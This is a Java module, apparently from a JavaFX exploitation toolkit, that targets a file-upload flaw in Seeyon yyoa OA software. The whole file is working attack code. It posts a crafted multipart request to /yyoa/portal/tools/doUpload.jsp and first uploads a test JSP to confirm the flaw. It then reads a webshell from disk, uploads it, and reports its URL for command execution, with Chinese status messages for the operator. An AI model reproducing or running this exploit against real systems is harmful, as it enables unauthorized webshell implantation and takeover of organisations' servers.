package exp.oa.seeyonoa.yyoa;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.Methods;

import java.util.Date;
import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class seeyon_yyoa_doUpload_upload implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    public static String doUpload(String url,String content){
        HashMap head = new HashMap();
        head.put("Content-Type","multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b");
        head.put("SL-CE-SUID","89");
        String postData = "--59229605f98b8cf290a7b8908b34616b\r\n" +
                "Content-Disposition: form-data; name=\"myfile\"; filename=\"R4g.jsp\"\r\n" +
                "Content-Type: application/octet-stream\r\n" +
                "\r\n" +
                content +
                "\r\n"+
                "--59229605f98b8cf290a7b8908b34616b--";
        Response res = HttpTools.post(url+"/yyoa/portal/tools/doUpload.jsp",postData,head,"utf-8");
        if(res.getCode()==200 && res.getText().contains(".jsp")){
            Pattern pattern = Pattern.compile("\"(.*?)\"");
            Matcher matcher = pattern.matcher(res.getText());
            String extractedString = null;
            if (matcher.find()) {
                extractedString = matcher.group(1);
            }
            Response res1 = HttpTools.get(url+"/yyoa/portal/upload/"+extractedString,new HashMap<>(),"utf-8");
            if(res1.getCode()==200 && extractedString != null){
                return url+"/yyoa/portal/upload/"+extractedString;
            }
        }
        return null;
    }

    private Boolean att(String url,TextArea textArea) {
        try {
            long t = (new Date()).getTime();
            String payload = "Hello R4g";
            String result = doUpload(url,payload);


            if ( result != null) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ seeyon_yyoa_doUpload_upload ]");
                    Response get = HttpTools.get(result,new HashMap<>(),"utf-8");
                    textArea.appendText("\n 文件上传成功: "+result+" \n 访问成功: "+get.getText());

                    textArea.appendText("\n 请进行UPLOAD上传文件并ATT执行(*CMD栏为空)");
                    textArea.appendText("\n");
                });


                return true;
            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception var8) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }


    private Boolean attcmd(String url,String pass, TextArea textArea,TextArea textArea_cmd) {
        try {


            String shell_payload = Methods.readFile(pass);
            long tt = (new Date()).getTime();
            String payload = tt+"\n" + shell_payload;
            String result = doUpload(url,payload);


            if ( result != null) {
                Response get = HttpTools.get(result,new HashMap<>(),"utf-8");
                Platform.runLater(() -> {
                    textArea.appendText("\n webshell上传成功: "+result+"----"+get.getText());
                });
                return true;


            }  else {
                Platform.runLater(() -> {
                    textArea.appendText("\n webshell文件上传失败，请手工测试");
                });
                return false;
            }

        } catch (Exception var8) {
            Platform.runLater(() -> {
                textArea.appendText("\n webshell文件上传失败，请手工测试");
                textArea.appendText("\n 连接异常！！！");
//                textArea.appendText(var8.getMessage());
            });
        }
        return false;
    }
}
